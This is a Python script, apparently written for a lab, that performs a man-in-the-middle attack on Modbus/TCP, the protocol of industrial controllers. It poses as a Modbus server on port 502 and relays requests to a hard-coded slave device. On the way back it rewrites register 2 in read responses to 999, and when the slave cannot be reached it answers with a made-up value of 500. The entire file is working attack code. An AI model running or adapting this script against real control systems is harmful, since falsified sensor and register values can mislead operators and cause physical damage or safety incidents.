#!/usr/bin/env python3
"""
FIXED Modbus MITM - Bridge + Forwarding
"""
import sys
import socket
import time
import threading
from scapy.all import *

MASTER_IP = "172.16.4.50"
SLAVE_IP = "172.16.4.51"
MITM_IP = "172.16.4.49"

def forward_to_slave(data, slave_ip=SLAVE_IP, slave_port=502):
    """Forward request til rigtig slave"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((slave_ip, slave_port))
        s.send(data)
        response = s.recv(1024)
        s.close()
        return response
    except:
        print("❌ Slave forward failed - sending fake response")
        return None

def handle_client(client_socket, client_addr):
    try:
        data = client_socket.recv(1024)
        if len(data) < 8:
            return
        
        tid = data[0:2]
        pid = data[2:4]
        unit_id = data[6]
        func_code = data[7]
        
        print(f"📥 RX from {client_addr}: FUNC={func_code:02x} UNIT={unit_id}")
        
        # FORWARD til slave (med manipulation)
        slave_resp = forward_to_slave(data)
        
        if slave_resp:
            print("🔄 FORWARDED to slave")
            # Manipuler slave response: register 2 = 999
            if func_code == 0x03 and len(slave_resp) > 11:
                addr = int.from_bytes(data[8:10], 'big')
                if addr <= 2 < addr + int.from_bytes(data[10:12], 'big'):
                    # Fake 999 på register 2
                    new_data = slave_resp[:9] + b'\x02' + (999).to_bytes(2, 'big') + slave_resp[13:]
                    client_socket.send(new_data)
                    print("✏️  MODIFIED: Register 2 = 999")
                    return
            client_socket.send(slave_resp)
        else:
            # FALLBACK fake response
            if func_code == 0x03:
                response = tid + pid + b'\x00\x05' + bytes([unit_id, 0x03, 0x02]) + (500).to_bytes(2, 'big')
                client_socket.send(response)
                print("🛡️  FAKE response: 500")
                
    except Exception as e:
        print(f"❌ Client error: {e}")
    finally:
        client_socket.close()

def modbus_server(port=502):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(5)
    print(f"🌐 FIXED MITM server on :{port} (FORWARDING ENABLED)")
    
    while True:
        client, addr = s.accept()
        print(f"🔗 Client {addr}")
        threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()

if __name__ == "__main__":
    modbus_server()